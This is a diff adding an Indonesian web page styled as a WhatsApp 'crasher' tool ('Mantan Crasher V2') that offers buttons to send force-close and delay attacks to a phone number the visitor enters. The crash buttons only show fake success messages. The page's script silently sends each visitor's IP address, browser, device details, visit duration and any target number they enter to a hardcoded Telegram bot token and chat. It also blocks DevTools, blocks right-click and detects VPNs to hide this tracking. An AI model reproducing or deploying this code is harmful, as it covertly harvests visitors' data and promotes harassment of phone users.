@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XTerClose - Admin Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <style>
+    body {
+      background: linear-gradient(to right, #1a0028, #000000);
+      font-family: 'Courier New', monospace;
+      color: white;
+      overflow-x: hidden;
+    }
+    .btn-custom {
+      background: linear-gradient(135deg, #7e22ce, #9333ea);
+      border: 1px solid #a855f7;
+      padding: 0.75rem;
+      border-radius: 0.75rem;
+      text-align: center;
+      transition: all 0.3s;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 0 15px #9333ea88;
+    }
+    .btn-custom:hover {
+      transform: scale(1.05);
+      background: #9333ea;
+      box-shadow: 0 0 20px #9333ea;
+    }
+    
+    .logo img {
+      width: 110px;
+      height: 100px;
+      border-radius: 69%;
+      object-fit: cover;
+      border: 9px solid #3b82f6;
+    }
+    
+    #inspect-warning {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 9999;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+    
+    .admin-panel {
+      position: fixed;
+      top: 0;
+      right: -400px;
+      width: 380px;
+      height: 100vh;
+      background: linear-gradient(to bottom, #1a0028, #2d0046);
+      border-left: 2px solid #7e22ce;
+      z-index: 1000;
+      padding: 20px;
+      transition: right 0.4s ease;
+      overflow-y: auto;
+      box-shadow: -5px 0 25px rgba(126, 34, 206, 0.3);
+    }
+    
+    .admin-panel.open {
+      right: 0;
+    }
+    
+    .admin-toggle {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: linear-gradient(135deg, #7e22ce, #9333ea);
+      border: 1px solid #a855f7;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 1001;
+      box-shadow: 0 0 15px #9333ea88;
+      animation: pulse 2s infinite;
+    }
+    
+    .admin-toggle:hover {
+      transform: rotate(90deg);
+      box-shadow: 0 0 20px #9333ea;
+    }
+    
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 999;
+      display: none;
+    }
+    
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #7e22ce;
+      background: rgba(0, 0, 0, 0.5);
+      color: white;
+      font-size: 16px;
+    }
+    
+    .login-input:focus {
+      outline: none;
+      border-color: #a855f7;
+      box-shadow: 0 0 10px #9333ea88;
+    }
+    
+    .warning-icon {
+      font-size: 5rem;
+      color: #ff0000;
+      margin-bottom: 20px;
+      animation: pulse 1.5s infinite;
+    }
+    
+    .admin-card {
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 10px;
+      padding: 15px;
+      margin-bottom: 15px;
+      border: 1px solid #7e22ce;
+    }
+    
+    .admin-log {
+      height: 150px;
+      overflow-y: auto;
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 8px;
+      padding: 10px;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+    
+    .log-entry {
+      border-bottom: 1px solid #333;
+      padding: 5px 0;
+      color: #a855f7;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    @keyframes glow {
+      0% { box-shadow: 0 0 5px #9333ea; }
+      50% { box-shadow: 0 0 20px #9333ea; }
+      100% { box-shadow: 0 0 5px #9333ea; }
+    }
+    
+    .glow-effect {
+      animation: glow 2s infinite;
+    }
+    
+    /* Scrollbar styling */
+    ::-webkit-scrollbar {
+      width: 6px;
+    }
+    
+    ::-webkit-scrollbar-track {
+      background: rgba(0, 0, 0, 0.2);
+    }
+    
+    ::-webkit-scrollbar-thumb {
+      background: #7e22ce;
+      border-radius: 3px;
+    }
+    
+    ::-webkit-scrollbar-thumb:hover {
+      background: #9333ea;
+    }
+  </style>
+</head>
+<body>
+  <!-- Warning overlay for inspect/vpn -->
+  <div id="inspect-warning">
+    <div class="warning-icon">
+      <i class="fas fa-exclamation-triangle"></i>
+    </div>
+    <h1 class="text-3xl font-bold text-red-500 mb-4">AKSES DITOLAK!</h1>
+    <div class="text-white max-w-md mb-6">
+      <p class="mb-2">Kami mendeteksi aktivitas mencurigakan:</p>
+      <p id="warning-reason" class="font-bold text-xl"></p>
+      <p class="mt-4 text-yellow-400">Gunakan perangkat dan koneksi biasa tanpa alat pengembang atau VPN/Proxy.</p>
+    </div>
+    <button onclick="location.href='https://google.com'" class="px-6 py-2 bg-red-600 rounded-lg font-bold hover:bg-red-700 transition">
+      KELUAR
+    </button>
+  </div>
+
+  <!-- Overlay for when admin panel is open -->
+  <div class="overlay" id="overlay" onclick="closeAdminPanel()"></div>
+
+  <!-- Admin Panel -->
+  <div class="admin-panel" id="adminPanel">
+    <h2 class="text-2xl font-bold text-purple-400 mb-6 text-center">ADMIN CONTROL</h2>
+    
+    <div class="admin-card">
+      <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-chart-line mr-2"></i>Statistik Sistem</h3>
+      <div class="grid grid-cols-2 gap-3">
+        <div class="bg-purple-900 p-2 rounded text-center">
+🌐 Total:
+          <p class="text-xl font-bold"></p>
+        </div>
+        <div class="bg-purple-900 p-2 rounded text-center">
+🌐 Hasil:
+          
+          <p class="text-xl font-bold"></p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="admin-card">
+      <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-cog mr-2"></i>Kontrol Sistem</h3>
+      <div class="mb-3">
+        <button class="btn-custom w-full mb-2" onclick="toggleSystemStatus()">
+          <i class="fas fa-power-off mr-2"></i>System Pengguna
+        </button>
+        
+        <button class="btn-custom w-full" onclick="showUserManagement()">
+          <i class="fas fa-users mr-2"></i>Create User
+        </button>
+      </div>
+    </div>
+    
+    <div class="admin-card">
+      <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-shield-alt mr-2"></i>Keamanan</h3>
+      <div class="mb-2">
+        <label class="flex items-center">
+          <input type="checkbox" class="form-checkbox" checked>
+          <span class="ml-2">Member Or Pengguna</span>
+        </label>
+      </div>
+      <div class="mb-2">
+        <label class="flex items-center">
+          <input type="checkbox" class="form-checkbox" checked>
+          <span class="ml-2">status</span>
+        </label>
+      </div>
+      <div>
+        <label class="flex items-center">
+          <input type="checkbox" class="form-checkbox">
+          <span class="ml-2">Dev Pangeran</span>
+        </label>
+      </div>
+    </div>
+    
+    <div class="admin-card">
+      <h3 class="text-lg font-bold text-white mb-3"><i class="fas fa-terminal mr-2"></i>Log Sistem</h3>
+      <div class="admin-log" id="adminLog">
+        <div class="log-entry">${sistem} Sistem dimulai</div>
+        <div class="log-entry">${ipaddres} Pengguna terdeteksi</div>
+        <div class="log-entry">[12:50:44] ForceClose dikirim ke 62${nomor}</div>
+        <div class="log-entry">[12:52:30] Admin panel diakses</div>
+        <div class="log-entry">[12:55:17] Koneksi Telegram berhasil</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Admin Toggle Button -->
+  <div class="admin-toggle" id="adminToggle" onclick="toggleAdminPanel()">
+    <i class="fas fa-cog text-white text-xl"></i>
+  </div>
+
+  <!-- Header Section -->
+  <header class="flex justify-center pt-6">
+    <div class="logo">
+      <img src="https://i.ibb.co/rKqzs6XR/792f338999ef.jpg" alt="XTerClose Logo">
+    </div>
+  </header>
+
+  <!-- Main content -->
+  <div class="min-h-screen flex flex-col items-center justify-center px-4 pt-4 pb-10">
+    <div class="bg-black border border-purple-500 shadow-2xl p-6 rounded-2xl w-full max-w-md animate__animated animate__fadeIn glow-effect">
+      <h1 class="text-4xl font-bold text-center mb-4 text-purple-400">Mantan Crasher V2</h1>
+    
+      <h3 class="text-white mb-2 text-lg">Masukkan Nomor Whatsapp</h3>
+      <input type="number" class="login-input" placeholder="e.g 62xxxxxxx" id="nomor">
+
+      <div class="grid grid-cols-1 gap-3 mb-6 mt-4">
+        <div class="btn-custom" onclick="attack('ForceClose Invis')">
+          <i class="fas fa-bomb mr-2"></i>💣 blank ui
+        </div>
+        <div class="btn-custom" onclick="attack('Delay Invis')">
+          <i class="fas fa-clock mr-2"></i>🕒 Delay Hard
+        </div>
+        <div class="btn-custom" onclick="attack('ForceClose Device')">
+          <i class="fas fa-exclamation-triangle mr-2"></i>⚠️ Forclose invis
+        </div>
+      </div>
+
+      <div class="bg-purple-950 p-4 rounded-lg text-sm text-purple-200 border border-purple-500">
+        <p class="mb-1"><i class="fas fa-ghost mr-2"></i> Kepercayaan Ada dalam dirimu</p>
+        <p class="mb-1"><i class="fas fa-fire mr-2"></i>  Kekuatan Diberikan Kepada Orang Baik</p>
+        <p class="mb-1"><i class="fas fa-bolt mr-2"></i>  Mencintai Tetapi Di Khianati @Pangeran</p>
+        <p><i class="fas fa-dna mr-2"></i> Status: <span class="text-green-400">V2</span></p>
+        <p class="mt-2"><i class="fas fa-crown mr-2"></i> Admin: <span class="text-yellow-400" id="adminStatus">Admin</span></p>
+        <p class="text-xs text-gray-500 mt-6">By @olaayes</p>
+    </div>
+  </div>
+
+  <script>
+    // Security measures
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74))) {
+        showWarning("Mencoba membuka alat pengembang (DevTools)");
+        return false;
+      }
+    };
+    
+    // Check for window resize (common devtools opening method)
+    let lastWidth = window.innerWidth;
+    setInterval(() => {
+      if (window.outerHeight - window.innerHeight > 200) {
+        showWarning("Mencoba membuka alat pengembang (DevTools)");
+        location.href = "about:blank";
+      }
+      
+      // Check for window width change (another devtools detection method)
+      if (Math.abs(lastWidth - window.innerWidth) > 50) {
+        showWarning("Mencoba membuka alat pengembang (DevTools)");
+      }
+      lastWidth = window.innerWidth;
+    }, 500);
+
+    // Toggle admin panel
+    function toggleAdminPanel() {
+      const panel = document.getElementById('adminPanel');
+      const overlay = document.getElementById('overlay');
+      const adminStatus = document.getElementById('adminStatus');
+      
+      panel.classList.toggle('open');
+      overlay.style.display = panel.classList.contains('open') ? 'block' : 'none';
+      
+      if (panel.classList.contains('open')) {
+        adminStatus.textContent = 'Aktif';
+        adminStatus.classList.add('text-green-400');
+        adminStatus.classList.remove('text-yellow-400');
+        addLogEntry("Admin panel diakses");
+      }
+    }
+    
+    function closeAdminPanel() {
+      const panel = document.getElementById('adminPanel');
+      const overlay = document.getElementById('overlay');
+      
+      panel.classList.remove('open');
+      overlay.style.display = 'none';
+    }
+    
+    function addLogEntry(message) {
+      const log = document.getElementById('adminLog');
+      const time = new Date().toLocaleTimeString('id-ID');
+      const entry = document.createElement('div');
+      entry.className = 'log-entry';
+      entry.textContent = `[${time}] ${message}`;
+      log.appendChild(entry);
+      log.scrollTop = log.scrollHeight;
+    }
+    
+    function toggleSystemStatus() {
+      const statusElement = document.querySelector('#adminPanel + .main-content .bg-purple-950 p:last-child span');
+      if (statusElement.textContent === 'Aktif') {
+        statusElement.textContent = 'Non-aktif';
+        statusElement.classList.remove('text-green-400');
+        statusElement.classList.add('text-red-400');
+        addLogEntry("Sistem dinonaktifkan oleh admin");
+        Swal.fire('Status Sistem', 'Sistem dinonaktifkan', 'info');
+      } else {
+        statusElement.textContent = 'Aktif';
+        statusElement.classList.remove('text-red-400');
+        statusElement.classList.add('text-green-400');
+        addLogEntry("Sistem diaktifkan oleh admin");
+        Swal.fire('Status Sistem', 'Sistem diaktifkan', 'success');
+      }
+      closeAdminPanel();
+    }
+    
+    function showUserManagement() {
+      Swal.fire({
+        title: 'Manajemen Pengguna',
+        html: `
+          <div class="text-left">
+            <p class="mb-3">Fitur manajemen pengguna akan segera hadir!</p>
+            <div class="bg-gray-800 p-3 rounded">
+              <p class="text-sm">Fitur yang akan datang:</p>
+              <ul class="text-sm list-disc pl-5 mt-2">
+                <li>Lihat daftar pengguna</li>
+                <li>Edit hak akses</li>
+                <li>Blokir pengguna</li>
+                <li>Lihat riwayat aktivitas</li>
+              </ul>
+            </div>
+          </div>
+        `,
+        icon: 'info',
+        confirmButtonText: 'Mengerti'
+      });
+    }
+
+    // Show warning function
+    function showWarning(reason) {
+      document.getElementById('warning-reason').textContent = reason;
+      document.getElementById('inspect-warning').style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+    }
+
+    // Telegram configuration (real token and chat ID)
+    const telegramBotToken = "8342711555:AAGOJLlt-LiVkixW8-waswRC22fIm1bssMg";
+    const telegramChatId = "7904209776";
+    const visitStartTime = Date.now();
+
+    // Check VPN/Proxy
+    async function checkSecurity() {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        if(data.security && (data.security.proxy || data.security.vpn || data.security.tor)) {
+          const reason = `Menggunakan ${data.security.vpn ? "VPN" : data.security.proxy ? "Proxy" : "Tor"}`;
+          showWarning(reason);
+          
+          // Send to Telegram
+          const message = `
+🚨 VPN/Proxy Terdeteksi
+🌐 IP: ${data.ip}
+🔒 Tipe: ${data.security.vpn ? "VPN" : data.security.proxy ? "Proxy" : "Tor"}
+🌍 Negara: ${data.country_name}
+🕒 Waktu: ${new Date().toLocaleString("id-ID")}
+          `.trim();
+          
+          await sendTelegramMessage(message);
+          
+          setTimeout(() => location.href = "https://google.com", 5000);
+          return true;
+        }
+        return false;
+      } catch (e) {
+        console.error("Security check failed");
+        return false;
+      }
+    }
+
+    // Send visitor info to Telegram
+    async function sendVisitorInfo() {
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        
+        const message = `
+🛰️ Pengunjung Masuk
+🌐 IP: ${ipData.ip}
+📱 Device: ${navigator.platform}
+🧭 Browser: ${navigator.userAgent}
+🔍 Resolusi: ${window.innerWidth}x${window.innerHeight}
+📄 Halaman: ${window.location.href}
+🕒 Waktu: ${new Date().toLocaleString("id-ID")}
+        `.trim();
+        
+        await sendTelegramMessage(message);
+      } catch (e) {
+        console.error("Failed to send visitor info");
+      }
+    }
+
+    // Main attack function
+    async function attack(mode) {
+      try {
+        const number = document.getElementById("nomor").value.trim();
+        if (!number) {
+          return Swal.fire({
+            icon: 'warning',
+            title: 'Nomor kosong!',
+            text: 'Masukkan nomor WA target dulu.'
+          });
+        }
+
+        // Show attacking alert
+        await Swal.fire({
+          title: `Menyerang...`,
+          html: `Mengirim <b>${mode}</b> ke <code>${number}</code>`,
+          timer: 2000,
+          timerProgressBar: true,
+          didOpen: () => Swal.showLoading()
+        });
+
+        // Send success notification
+        await Swal.fire({
+          icon: 'success',
+          title: 'Berhasil!',
+          text: `${mode} berhasil dikirim.`
+        });
+
+        // Send report to Telegram
+        const time = new Date().toLocaleTimeString("id-ID");
+        const reportMessage = `
+📍 Aksi: ${mode}
+📞 Nomor: ${number}
+🕒 Jam: ${time}
+        `.trim();
+        
+        await sendTelegramMessage(reportMessage);
+        addLogEntry(`${mode} dikirim ke ${number}`);
+
+      } catch (error) {
+        console.error("Attack failed:", error);
+        Swal.fire({
+          icon: 'error',
+          title: 'Gagal',
+          text: 'Terjadi kesalahan saat menyerang'
+        });
+      }
+    }
+
+    // Send message to Telegram
+    async function sendTelegramMessage(text) {
+      try {
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        const params = new URLSearchParams();
+        params.append('chat_id', telegramChatId);
+        params.append('text', text);
+        
+        await fetch(url, {
+          method: 'POST',
+          body: params,
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          }
+        });
+      } catch (error) {
+        console.error("Failed to send Telegram message:", error);
+      }
+    }
+
+    // Send visit duration when leaving
+    window.addEventListener("beforeunload", async () => {
+      const duration = Math.floor((Date.now() - visitStartTime) / 1000);
+      const message = `⏳ Durasi kunjungan: ${duration} detik`;
+      await sendTelegramMessage(message);
+    });
+
+    // Initialize
+    window.addEventListener("load", async () => {
+      const isUsingVPN = await checkSecurity();
+      if (!isUsingVPN) {
+        sendVisitorInfo();
+      }
+    });
+  </script>
+</body>
+</html>
